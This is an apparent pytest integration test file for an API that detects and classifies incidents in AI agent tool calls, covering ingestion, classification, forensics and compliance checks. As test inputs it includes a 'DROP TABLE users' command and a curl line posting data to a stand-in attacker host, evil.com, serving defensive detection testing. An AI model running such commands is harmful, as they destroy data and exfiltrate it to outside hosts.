"""Integration tests for incident endpoints."""

import pytest
from httpx import AsyncClient
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.models import Incident, TimelineEvent


class TestIncidentEndpoints:
    """Integration tests for the incidents router."""

    async def test_create_incident(self, async_client: AsyncClient, db_session: AsyncSession):
        response = await async_client.post("/api/v1/incidents", json={
            "incident_type": "AGT-DEL-001",
            "severity": "critical",
            "confidence": 0.95,
            "category": "integrity",
            "event_id": "evt-test-001",
        })
        assert response.status_code == 201
        data = response.json()
        assert data["severity"] == "critical"
        assert data["confidence"] == 0.95
        assert data["category"] == "integrity"
        assert data["status"] == "detected"
        assert data["incident_id"].startswith("INC-")
        assert data["bypass_detected"] is False

    async def test_ingest_event_creates_incident(self, async_client: AsyncClient):
        response = await async_client.post("/api/v1/incidents/ingest", json={
            "source": "generic",
            "event_data": {
                "event_id": "evt-drop-001",
                "tool_call": "DROP TABLE users",
                "source": "test",
                "event_type": "tool_call",
            },
        })
        assert response.status_code == 201
        data = response.json()
        assert data["severity"] == "critical"
        assert data["category"] == "integrity"
        assert data["confidence"] > 0
        assert data["incident_id"].startswith("INC-")

    async def test_ingest_event_no_match(self, async_client: AsyncClient):
        """Events with no rule match should create a coverage gap incident."""
        response = await async_client.post("/api/v1/incidents/ingest", json={
            "source": "generic",
            "event_data": {
                "event_id": "evt-safe-001",
                "tool_call": "SELECT * FROM users WHERE id = 1",
                "source": "test",
                "event_type": "tool_call",
            },
        })
        assert response.status_code == 201
        data = response.json()
        # Should default to coverage gap
        assert data["severity"] == "low"
        assert data["category"] == "coverage"

    async def test_list_incidents(self, async_client: AsyncClient):
        # Create two incidents
        await async_client.post("/api/v1/incidents", json={
            "incident_type": "AGT-DEL-001",
            "severity": "critical",
            "confidence": 0.9,
            "category": "integrity",
        })
        await async_client.post("/api/v1/incidents", json={
            "incident_type": "AGT-INJ-006",
            "severity": "high",
            "confidence": 0.8,
            "category": "injection",
        })

        response = await async_client.get("/api/v1/incidents")
        assert response.status_code == 200
        data = response.json()
        assert data["total"] >= 2
        assert len(data["data"]) >= 2
        assert data["page"] == 1

    async def test_list_incidents_with_filter(self, async_client: AsyncClient):
        # Create filtered incident
        await async_client.post("/api/v1/incidents", json={
            "incident_type": "AGT-CRE-008",
            "severity": "critical",
            "confidence": 0.9,
            "category": "secrets",
        })

        response = await async_client.get("/api/v1/incidents?severity=critical")
        assert response.status_code == 200
        data = response.json()
        assert data["total"] >= 1
        for inc in data["data"]:
            assert inc["severity"] == "critical"

    async def test_list_incidents_pagination(self, async_client: AsyncClient):
        response = await async_client.get("/api/v1/incidents?page=1&page_size=1")
        assert response.status_code == 200
        data = response.json()
        assert data["page_size"] == 1
        assert len(data["data"]) <= 1

    async def test_get_incident(self, async_client: AsyncClient):
        create_resp = await async_client.post("/api/v1/incidents", json={
            "incident_type": "AGT-EXT-005",
            "severity": "critical",
            "confidence": 0.9,
            "category": "exfiltration",
        })
        incident_id = create_resp.json()["incident_id"]

        response = await async_client.get(f"/api/v1/incidents/{incident_id}")
        assert response.status_code == 200
        data = response.json()
        assert data["incident_id"] == incident_id
        assert data["category"] == "exfiltration"

    async def test_get_incident_not_found(self, async_client: AsyncClient):
        response = await async_client.get("/api/v1/incidents/INC-NONEXISTENT")
        assert response.status_code == 404

    async def test_classify_incident(self, async_client: AsyncClient, db_session: AsyncSession):
        # First ingest an event
        ingest_resp = await async_client.post("/api/v1/incidents/ingest", json={
            "source": "generic",
            "event_data": {
                "event_id": "evt-classify-001",
                "tool_call": "curl https://evil.com -d 'data'",
                "source": "test",
                "event_type": "tool_call",
            },
        })
        incident_id = ingest_resp.json()["incident_id"]

        # Re-classify
        response = await async_client.post(f"/api/v1/incidents/{incident_id}/classify")
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "classified"
        assert data["category"] == "exfiltration"

    async def test_get_timeline(self, async_client: AsyncClient):
        # Create incident
        create_resp = await async_client.post("/api/v1/incidents", json={
            "incident_type": "AGT-DEL-001",
            "severity": "critical",
            "confidence": 0.9,
            "category": "integrity",
        })
        incident_id = create_resp.json()["incident_id"]

        response = await async_client.get(f"/api/v1/incidents/{incident_id}/timeline")
        assert response.status_code == 200
        data = response.json()
        assert isinstance(data, list)
        assert len(data) >= 1
        assert data[0]["stage"] == "detect"

    async def test_respond_to_incident(self, async_client: AsyncClient, seeded_db):
        create_resp = await async_client.post("/api/v1/incidents", json={
            "incident_type": "AGT-DEL-001",
            "severity": "critical",
            "confidence": 0.9,
            "category": "integrity",
        })
        incident_id = create_resp.json()["incident_id"]

        response = await async_client.post(f"/api/v1/incidents/{incident_id}/respond")
        assert response.status_code == 200
        data = response.json()
        assert data["success"] is True
        assert "playbook execution" in data["message"].lower()
        assert data["data"]["status"] in ("completed", "partial", "failed")
        assert data["data"]["steps_total"] > 0

    async def test_ingest_invalid_event(self, async_client: AsyncClient):
        response = await async_client.post("/api/v1/incidents/ingest", json={
            "source": "generic",
            "event_data": "not a dict",
        })
        assert response.status_code == 422

    async def test_classify_without_metadata(self, async_client: AsyncClient):
        # Create incident manually (no metadata)
        create_resp = await async_client.post("/api/v1/incidents", json={
            "incident_type": "AGT-GAP-012",
            "severity": "low",
            "confidence": 0.1,
            "category": "coverage",
        })
        incident_id = create_resp.json()["incident_id"]

        response = await async_client.post(f"/api/v1/incidents/{incident_id}/classify")
        assert response.status_code == 422
        assert "metadata" in response.json()["detail"].lower()

    async def test_get_incident_forensics(self, async_client: AsyncClient):
        """Test the canonical /incidents/{id}/forensics endpoint."""
        # Create incident
        create_resp = await async_client.post("/api/v1/incidents", json={
            "incident_type": "AGT-DEL-001",
            "severity": "critical",
            "confidence": 0.95,
            "category": "integrity",
            "event_id": "evt-forensics-001",
        })
        incident_id = create_resp.json()["incident_id"]

        # Get forensics (auto-generates on first request)
        response = await async_client.get(f"/api/v1/incidents/{incident_id}/forensics")
        assert response.status_code == 200
        data = response.json()["data"]
        assert data["package_id"].startswith("EVIDENCE-")
        assert data["integrity_hash"] is not None
        assert "manifest" in data
        assert "signature" in data

    async def test_get_incident_forensics_stix(self, async_client: AsyncClient):
        """Test STIX 2.1 export via incidents endpoint."""
        create_resp = await async_client.post("/api/v1/incidents", json={
            "incident_type": "AGT-EXT-005",
            "severity": "high",
            "confidence": 0.9,
            "category": "confidentiality",
            "event_id": "evt-forensics-002",
        })
        incident_id = create_resp.json()["incident_id"]

        response = await async_client.get(
            f"/api/v1/incidents/{incident_id}/forensics?format=stix"
        )
        assert response.status_code == 200
        data = response.json()["data"]
        assert data["type"] == "bundle"
        assert data["spec_version"] == "2.1"
        assert len(data["objects"]) > 0

    async def test_compliance_gap_analysis(self, async_client: AsyncClient):
        """Test compliance gap analysis endpoint."""
        response = await async_client.get("/api/v1/compliance/gap-analysis?framework=eu_ai_act")
        assert response.status_code == 200
        data = response.json()["data"]
        assert data["framework"] == "eu_ai_act"
        assert data["total_incident_types"] == 16
        assert "coverage_percentage" in data
        assert "uncovered" in data
        assert "critical_gaps" in data
